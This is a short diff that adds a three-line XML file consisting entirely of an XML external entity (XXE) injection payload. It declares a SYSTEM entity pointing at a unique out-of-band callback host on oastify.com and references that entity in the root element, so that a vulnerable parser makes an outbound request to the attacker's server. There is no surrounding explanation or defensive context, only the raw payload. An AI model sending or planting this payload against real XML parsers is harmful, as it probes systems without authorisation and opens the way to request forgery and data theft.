@@ -1,0 +1,3 @@
+
+<!DOCTYPE x [ <!ENTITY test SYSTEM "http://ezhu6yj9r42ejtmrlesegvnpcgi76xum.oastify.com"> ]>
+<x>&test;</x>
